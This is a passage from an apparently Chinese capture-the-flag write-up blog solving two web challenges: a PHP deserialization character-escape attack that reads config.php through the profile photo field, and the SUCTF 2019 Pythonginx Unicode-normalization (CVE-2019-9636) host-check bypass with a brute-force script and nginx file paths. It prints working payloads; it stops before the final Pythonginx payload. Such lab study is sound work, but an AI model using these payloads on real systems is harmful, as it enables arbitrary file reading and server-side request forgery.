class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">require_once</span>(<span class="string">'class.php'</span>);</span></span><br><span class="line"><span class="php"><span class="keyword">if</span>($_POST[<span class="string">'username'</span>] &amp;&amp; $_POST[<span class="string">'password'</span>]) &#123;</span></span><br><span class="line"><span class="php">$username = $_POST[<span class="string">'username'</span>];</span></span><br><span class="line"><span class="php">$password = $_POST[<span class="string">'password'</span>];</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">if</span>(strlen($username) &lt; <span class="number">3</span> <span class="keyword">or</span> strlen($username) &gt; <span class="number">16</span>) </span></span><br><span class="line"><span class="php"><span class="keyword">die</span>(<span class="string">'Invalid user name'</span>);</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">if</span>(strlen($password) &lt; <span class="number">3</span> <span class="keyword">or</span> strlen($password) &gt; <span class="number">16</span>) </span></span><br><span class="line"><span class="php"><span class="keyword">die</span>(<span class="string">'Invalid password'</span>);</span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(!$user-&gt;is_exists($username)) &#123;</span></span><br><span class="line"><span class="php">$user-&gt;register($username, $password);</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">'Register OK!&lt;a href="index.php"&gt;Please Login&lt;/a&gt;'</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="php"><span class="keyword">die</span>(<span class="string">'User name Already Exists'</span>);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">title</span>&gt;</span>Login<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">link</span> <span class="attr">href</span>=<span class="string">"static/bootstrap.min.css"</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"static/jquery.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"static/bootstrap.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"container"</span> <span class="attr">style</span>=<span class="string">"margin-top:100px"</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"register.php"</span> <span class="attr">method</span>=<span class="string">"post"</span> <span class="attr">class</span>=<span class="string">"well"</span> <span class="attr">style</span>=<span class="string">"width:220px;margin:0px auto;"</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"static/piapiapia.gif"</span> <span class="attr">class</span>=<span class="string">"img-memeda "</span> <span class="attr">style</span>=<span class="string">"width:180px;margin:0px auto;"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h3</span>&gt;</span>Register<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">label</span>&gt;</span>Username:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"username"</span> <span class="attr">style</span>=<span class="string">"height:30px"</span><span class="attr">class</span>=<span class="string">"span3"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">label</span>&gt;</span>Password:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"password"</span> <span class="attr">name</span>=<span class="string">"password"</span> <span class="attr">style</span>=<span class="string">"height:30px"</span> <span class="attr">class</span>=<span class="string">"span3"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">class</span>=<span class="string">"btn btn-primary"</span>&gt;</span>REGISTER<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure></p><p>由于审计不是太好，加上源码太多，所以用了seay审计工具审计了一下<br><img src="/img/Nepnep/piapiapia0.png" alt="avatar"></p><p>发现profile.php存在一个任意文件读取<br><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">$profile = unserialize($profile)<span class="comment">;</span></span><br><span class="line">$phone = $profile[<span class="string">'phone'</span>]<span class="comment">;</span></span><br><span class="line">$email = $profile[<span class="string">'email'</span>]<span class="comment">;</span></span><br><span class="line">$nickname = $profile[<span class="string">'nickname'</span>]<span class="comment">;</span></span><br><span class="line">$photo = base64_encode(file_get_contents($profile[<span class="string">'photo'</span>]))<span class="comment">;</span></span><br></pre></td></tr></table></figure><br>发现这里使用了file_get_contents()函数来获取photo的值，又发现在config.php中有flag,基本可以得知只要让photo的值等于config.php，基本上就能得到flag了</p><h2 id="知识点-1"><a href="#知识点-1" class="headerlink" title="知识点"></a>知识点</h2><p>·任意文件读取<br>·参数传递数组绕过字符串检测</p><h3 id="PHP反序列化逃逸"><a href="#PHP反序列化逃逸" class="headerlink" title="PHP反序列化逃逸"></a>PHP反序列化逃逸</h3><p>这里参考了<br><a href="https://www.cnblogs.com/g0udan/p/12216207.html" target="_blank" rel="noopener">https://www.cnblogs.com/g0udan/p/12216207.html</a></p><p>举一个例子<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="regexp">//</span><span class="variable">$a</span> = array(<span class="string">'123'</span>, <span class="string">'abc'</span>, <span class="string">'defg'</span>);</span><br><span class="line"><span class="regexp">//</span>var_dump(serialize(<span class="variable">$a</span>));</span><br><span class="line"><span class="regexp">//</span><span class="string">"a:3:&#123;i:0;s:3:"</span><span class="number">123</span><span class="string">";i:1;s:3:"</span>abc<span class="string">";i:2;s:4:"</span>defg<span class="string">";&#125;"</span></span><br><span class="line"><span class="variable">$b</span> = <span class="string">'a:3:&#123;i:0;s:3:"123";i:1;s:3:"abc";i:2;s:4:"defg";&#125;'</span>;</span><br><span class="line">var_dump(unserialize(<span class="variable">$b</span>));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><br>运行结果：<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">array(<span class="number">3</span>) &#123; [<span class="number">0</span>]=&gt; <span class="type">string</span>(<span class="number">3</span>) <span class="string">"123"</span> [<span class="number">1</span>]=&gt; <span class="type">string</span>(<span class="number">3</span>) <span class="string">"abc"</span> [<span class="number">2</span>]=&gt; <span class="type">string</span>(<span class="number">4</span>) <span class="string">"defg"</span> &#125;</span><br></pre></td></tr></table></figure><br>可以看到数组反序列化之后的字符串是以”;}来结尾的，如果我们把”;}带入到我们想要的字符串中，就可以提前闭合</p><p>把第二个值abc换成abc”;i:2;s:5:”qwert”;}<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="regexp">//</span><span class="variable">$a</span> = array(<span class="string">'123'</span>, <span class="string">'abc'</span>, <span class="string">'defg'</span>);</span><br><span class="line"><span class="regexp">//</span>var_dump(serialize(<span class="variable">$a</span>));</span><br><span class="line"><span class="regexp">//</span><span class="string">"a:3:&#123;i:0;s:3:"</span><span class="number">123</span><span class="string">";i:1;s:3:"</span>abc<span class="string">";i:2;s:4:"</span>defg<span class="string">";&#125;"</span></span><br><span class="line"><span class="variable">$b</span> = <span class="string">'a:3:&#123;i:0;s:3:"123";i:1;s:3:"abc";i:2;s:5:"qwert";&#125;";i:2;s:4:"defg";&#125;'</span>;</span><br><span class="line">var_dump(unserialize(<span class="variable">$b</span>));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>运行结果：<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">array(<span class="number">3</span>) &#123; [<span class="number">0</span>]=&gt; <span class="type">string</span>(<span class="number">3</span>) <span class="string">"123"</span> [<span class="number">1</span>]=&gt; <span class="type">string</span>(<span class="number">3</span>) <span class="string">"abc"</span> [<span class="number">2</span>]=&gt; <span class="type">string</span>(<span class="number">5</span>) <span class="string">"qwert"</span> &#125;</span><br></pre></td></tr></table></figure><br>我们发现qwert代替了defg的位置</p><p>回到这题，我们发现例如select,where等会被替换为hacker，我们又得知了update.php是先序列化再进行替换，这就出现了一个问题，在序列化之后，参数的长度就被写死了，但是如果我们输入的是where,不合法，会被替换为hacker;</p><p>而where长度是5，hacker长度是6，参数长度又被写死了，再替换的时候就会形成实际参数长度大于了规定参数长度，就会发生溢出，这里其实就是PHP的反序列化字符逃逸</p><p>我们的目的是让photo的值为config.php，从而读出flag，所以结合刚才闭合的知识，构造一个字符串<br><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">";&#125;<span class="selector-tag">s</span><span class="selector-pseudo">:5</span><span class="selector-pseudo">:"photo"</span>;<span class="selector-tag">s</span><span class="selector-pseudo">:10</span><span class="selector-pseudo">:"config.php"</span>;&#125;</span><br></pre></td></tr></table></figure><br>将其插入到序列化的字符串中去，可以看到构造的字符串，长度为34，而where每被替换成hacker,长度就会+1，所以我们共需要where*34</p><h2 id="测试过程-1"><a href="#测试过程-1" class="headerlink" title="测试过程"></a>测试过程</h2><p>config.php是我们想要的文件，可以先放一边</p><p>先看update.php<br><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="symbol">$</span>_POST[<span class="string">'phone'</span>] &amp;&amp; <span class="symbol">$</span>_POST[<span class="string">'email'</span>] &amp;&amp; <span class="symbol">$</span>_POST[<span class="string">'nickname'</span>] &amp;&amp; <span class="symbol">$</span>_FILES[<span class="string">'photo'</span>]) &#123;</span><br><span class="line"></span><br><span class="line"><span class="symbol">$</span>username = <span class="symbol">$</span>_SESSION[<span class="string">'username'</span>];</span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">'/^\d&#123;11&#125;$/'</span>, <span class="symbol">$</span>_POST[<span class="string">'phone'</span>]))</span><br><span class="line">die(<span class="string">'Invalid phone'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">'/^[_a-zA-Z0-9]&#123;1,10&#125;@[_a-zA-Z0-9]&#123;1,10&#125;\.[_a-zA-Z0-9]&#123;1,10&#125;$/'</span>, <span class="symbol">$</span>_POST[<span class="string">'email'</span>]))</span><br><span class="line">die(<span class="string">'Invalid email'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/[^a-zA-Z0-9_]/'</span>, <span class="symbol">$</span>_POST[<span class="string">'nickname'</span>]) || strlen(<span class="symbol">$</span>_POST[<span class="string">'nickname'</span>]) &gt; <span class="number">10</span>)</span><br><span class="line">die(<span class="string">'Invalid nickname'</span>);</span><br><span class="line"></span><br><span class="line"><span class="symbol">$</span><span class="keyword">file</span> = <span class="symbol">$</span>_FILES[<span class="string">'photo'</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="symbol">$</span><span class="keyword">file</span>[<span class="string">'size'</span>] &lt; <span class="number">5</span> <span class="keyword">or</span> <span class="symbol">$</span><span class="keyword">file</span>[<span class="string">'size'</span>] &gt; <span class="number">1000000</span>)</span><br><span class="line">die(<span class="string">'Photo size error'</span>);</span><br><span class="line"></span><br><span class="line">move_uploaded_file(<span class="symbol">$</span><span class="keyword">file</span>[<span class="string">'tmp_name'</span>], <span class="string">'upload/'</span> . md5(<span class="symbol">$</span><span class="keyword">file</span>[<span class="string">'name'</span>]));</span><br><span class="line"><span class="symbol">$</span>profile[<span class="string">'phone'</span>] = <span class="symbol">$</span>_POST[<span class="string">'phone'</span>];</span><br><span class="line"><span class="symbol">$</span>profile[<span class="string">'email'</span>] = <span class="symbol">$</span>_POST[<span class="string">'email'</span>];</span><br><span class="line"><span class="symbol">$</span>profile[<span class="string">'nickname'</span>] = <span class="symbol">$</span>_POST[<span class="string">'nickname'</span>];</span><br><span class="line"><span class="symbol">$</span>profile[<span class="string">'photo'</span>] = <span class="string">'upload/'</span> . md5(<span class="symbol">$</span><span class="keyword">file</span>[<span class="string">'name'</span>]);</span><br><span class="line"></span><br><span class="line"><span class="symbol">$</span>user-&gt;update_profile(<span class="symbol">$</span>username, serialize(<span class="symbol">$</span>profile));</span><br><span class="line">echo <span class="string">'Update Profile Success!&lt;a href="profile.php"&gt;Your Profile&lt;/a&gt;'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>可以看到使用了正则来让phone,email合法化，nickname使用了正则和strlen函数，但是其中的关系为或，所以我们可以使用知识点2来对正则进行绕过，这里的知识点2就是将参数转换成数组，从而绕过了字符串的检测，让strlen函数满足就可以绕过正则了</p><p>接下来看看update_profile是什么函数，全局搜索，发现在class.php中<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update_profile</span><span class="params">($username, $new_profile)</span> </span>&#123;</span><br><span class="line">$username = <span class="keyword">parent</span>::filter($username);</span><br><span class="line">$new_profile = <span class="keyword">parent</span>::filter($new_profile);</span><br><span class="line"></span><br><span class="line">$where = <span class="string">"username = '$username'"</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">parent</span>::update(<span class="keyword">$this</span>-&gt;table, <span class="string">'profile'</span>, $new_profile, $where);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>在class.php中查看剩下的函数</p><p>最后发现update.php的目的就是通过正则来过滤用户输入的值，然后进行序列化，非法的值会被过滤成hacker</p><p>先访问register.php，随便注册一个账号,并且登录</p><p>随便填写一下数据，并且抓包</p><p>将包里的nickname改为nickname[]<br>将其赋值为<br><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere</span>";&#125;<span class="selector-tag">s</span><span class="selector-pseudo">:5</span><span class="selector-pseudo">:"photo"</span>;<span class="selector-tag">s</span><span class="selector-pseudo">:10</span><span class="selector-pseudo">:"config.php"</span>;&#125;</span><br></pre></td></tr></table></figure><br>这样一来，where会被替换为hacker，增多了34个长度，实际长度在序列化的时候就写死了，那么后面的”;}s:5:”photo”;s:10:”config.php”;}就会被挤出去，最后被读取为photo的值，末尾的”;}会将后面的闭合掉，那么upload也就没有意义了</p><p>发包，然后去profile.php查看读取到的congfig.php</p><p><img src="/img/Nepnep/piapiapia1.png" alt="avatar"></p><p>解码之后，得到flag</p><p>而至于为什么要用”;}，而不用”; ，是因为我们使用的是数组</p><p>这里举个例子<br><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$a=<span class="built_in">array</span>(<span class="string">'12345678910'</span>,<span class="string">'ssr@qq.com'</span>,<span class="string">'XXX'</span>);</span><br><span class="line">var_dump(serialize($a));</span><br></pre></td></tr></table></figure></p><p>运行结果：<br><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">a</span><span class="selector-pseudo">:3</span>:&#123;<span class="attribute">i</span>:<span class="number">0</span>;<span class="attribute">s</span>:<span class="number">11</span>:<span class="string">"12345678910"</span>;<span class="attribute">i</span>:<span class="number">1</span>;<span class="attribute">s</span>:<span class="number">10</span>:<span class="string">"ssr@qq.com"</span>;<span class="attribute">i</span>:<span class="number">2</span>;<span class="attribute">s</span>:<span class="number">3</span>:<span class="string">"XXX"</span>;&#125;</span><br></pre></td></tr></table></figure></p><p>这是正常的序列化，而我们将刚才构造的字符串加上</p><figure class="highlight julia"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$a=array('<span class="number">12345678910</span><span class="string">','</span>ssr<span class="meta">@qq</span>.com<span class="string">','</span><span class="string">XXX";&#125;s:5:"photo</span><span class="string">";s:10:"config</span>.<span class="string">php";&#125;');</span></span><br><span class="line"><span class="string">var_dump(serialize(<span class="variable">$a</span>));</span></span><br></pre></td></tr></table></figure><p>运行结果：<br><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">a</span><span class="selector-pseudo">:3</span>:&#123;<span class="attribute">i</span>:<span class="number">0</span>;<span class="attribute">s</span>:<span class="number">11</span>:<span class="string">"12345678910"</span>;<span class="attribute">i</span>:<span class="number">1</span>;<span class="attribute">s</span>:<span class="number">10</span>:<span class="string">"ssr@qq.com"</span>;<span class="attribute">i</span>:<span class="number">2</span>;<span class="attribute">s</span>:<span class="number">37</span>:<span class="string">"XXX"</span>;&#125;<span class="selector-tag">s</span><span class="selector-pseudo">:5</span><span class="selector-pseudo">:"photo"</span>;<span class="selector-tag">s</span><span class="selector-pseudo">:10</span><span class="selector-pseudo">:"config.php"</span>;&#125;";&#125;</span><br></pre></td></tr></table></figure><br>我们可以看到，数组由于是以”;}结尾的，加上之后，字符串中的前面的”;}闭合了前面的，后面的”;}又闭合了序列化生成的”;},这样就达到了目的</p><h1 id="SUCTF-2019-Pythonginx"><a href="#SUCTF-2019-Pythonginx" class="headerlink" title="SUCTF 2019-Pythonginx"></a>SUCTF 2019-Pythonginx</h1><h2 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h2><p>打开之后，给出了源码<br><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">def getUrl():</span><br><span class="line">    url = request.<span class="keyword">args</span>.<span class="built_in">get</span>(<span class="string">"url"</span>)</span><br><span class="line">    host = parse.urlparse(url).<span class="built_in">hostname</span></span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">'suctf.cc'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"我扌 your problem? 111"</span></span><br><span class="line">    parts = <span class="keyword">list</span>(urlsplit(url))</span><br><span class="line">    host = parts[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">'suctf.cc'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"我扌 your problem? 222 "</span> + host</span><br><span class="line">    newhost = []</span><br><span class="line">    <span class="keyword">for</span> h in host.<span class="keyword">split</span>(<span class="string">'.'</span>):</span><br><span class="line">        newhost.<span class="keyword">append</span>(h.encode(<span class="string">'idna'</span>).decode(<span class="string">'utf-8'</span>))</span><br><span class="line">    parts[<span class="number">1</span>] = <span class="string">'.'</span>.<span class="keyword">join</span>(newhost)</span><br><span class="line">    #去掉 url 中的空格</span><br><span class="line">    finalUrl = urlunsplit(parts).<span class="keyword">split</span>(<span class="string">' '</span>)[<span class="number">0</span>]</span><br><span class="line">    host = parse.urlparse(finalUrl).<span class="built_in">hostname</span></span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">'suctf.cc'</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.request.urlopen(finalUrl).<span class="keyword">read</span>()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"我扌 your problem? 333"</span></span><br></pre></td></tr></table></figure><br>发现并没有什么思路，去查了一下WP</p><p>参考了<br><a href="http://www.mamicode.com/info-detail-2772324.html" target="_blank" rel="noopener">http://www.mamicode.com/info-detail-2772324.html</a><br><a href="https://www.cnblogs.com/Cl0ud/p/12187204.html" target="_blank" rel="noopener">https://www.cnblogs.com/Cl0ud/p/12187204.html</a></p><h2 id="知识点-2"><a href="#知识点-2" class="headerlink" title="知识点"></a>知识点</h2><h3 id="CVE-2019-9636：urlsplit不处理NFKC标准化"><a href="#CVE-2019-9636：urlsplit不处理NFKC标准化" class="headerlink" title="CVE-2019-9636：urlsplit不处理NFKC标准化"></a>CVE-2019-9636：urlsplit不处理NFKC标准化</h3><p><a href="https://bugs.python.org/issue36216" target="_blank" rel="noopener">https://bugs.python.org/issue36216</a></p><h3 id="Nginx重要文件位置"><a href="#Nginx重要文件位置" class="headerlink" title="Nginx重要文件位置"></a>Nginx重要文件位置</h3><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">配置文件存放目录：<span class="meta-keyword">/etc/</span>nginx</span><br><span class="line">主配置文件：<span class="meta-keyword">/etc/</span>nginx<span class="meta-keyword">/conf/</span>nginx.conf</span><br><span class="line">管理脚本：<span class="meta-keyword">/usr/</span>lib64<span class="meta-keyword">/systemd/</span>system/nginx.service</span><br><span class="line">模块：<span class="meta-keyword">/usr/</span>lisb64<span class="meta-keyword">/nginx/</span>modules</span><br><span class="line">应用程序：<span class="meta-keyword">/usr/</span>sbin/nginx</span><br><span class="line">程序默认存放位置：<span class="meta-keyword">/usr/</span>share<span class="meta-keyword">/nginx/</span>html</span><br><span class="line">日志默认存放位置：<span class="meta-keyword">/var/</span>log/nginx</span><br></pre></td></tr></table></figure><h2 id="测试过程-2"><a href="#测试过程-2" class="headerlink" title="测试过程"></a>测试过程</h2><p>blackhat该议题中想要说明的一点，当URL 中出现一些特殊字符的时候，输出的结果可能不在预期</p><p>所以按照getUrl函数写出爆破脚本即可得到我们能够逃逸的构造语句了</p><p>脚本是偷来的,自己做了一点注释<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlparse, urlunsplit, urlsplit</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_unicode</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">65536</span>):   <span class="comment">#遍历所有整数对应的ASCII字符</span></span><br><span class="line">        uni = chr(x)</span><br><span class="line">        url = <span class="string">"http://suctf.c&#123;&#125;"</span>.format(uni)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> getUrl(url):</span><br><span class="line">                print(<span class="string">"str: "</span> + uni + <span class="string">' unicode: \\u'</span> + str(hex(x))[<span class="number">2</span>:])</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getUrl</span><span class="params">(url)</span>:</span></span><br><span class="line">    url = url</span><br><span class="line">    host = parse.urlparse(url).hostname</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">'suctf.cc'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    parts = list(urlsplit(url))</span><br><span class="line">    host = parts[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">'suctf.cc'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    newhost = []</span><br><span class="line">    <span class="keyword">for</span> h <span class="keyword">in</span> host.split(<span class="string">'.'</span>):</span><br><span class="line">        newhost.append(h.encode(<span class="string">'idna'</span>).decode(<span class="string">'utf-8'</span>))</span><br><span class="line">    parts[<span class="number">1</span>] = <span class="string">'.'</span>.join(newhost)</span><br><span class="line">    finalUrl = urlunsplit(parts).split(<span class="string">' '</span>)[<span class="number">0</span>]</span><br><span class="line">    host = parse.urlparse(finalUrl).hostname</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">'suctf.cc'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    get_unicode()</span><br></pre></td></tr></table></figure></p><p>运行结果<br><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">str:</span> ℂ <span class="string">unicode:</span> \u2102</span><br><span class="line"><span class="string">str:</span> ℭ <span class="string">unicode:</span> \u212d</span><br><span class="line"><span class="string">str:</span> Ⅽ <span class="string">unicode:</span> \u216d</span><br><span class="line"><span class="string">str:</span> ⅽ <span class="string">unicode:</span> \u217d</span><br><span class="line"><span class="string">str:</span> Ⓒ <span class="string">unicode:</span> \u24b8</span><br><span class="line"><span class="string">str:</span> ⓒ <span class="string">unicode:</span> \u24d2</span><br><span class="line"><span class="string">str:</span> Ｃ <span class="string">unicode:</span> \uff23</span><br><span class="line"><span class="string">str:</span> ｃ <span class="string">unicode:</span> \uff43</span><br></pre></td></tr></table></figure><br>随便选一个构造payload<br><figure class="highlight awk"><table><tr><td 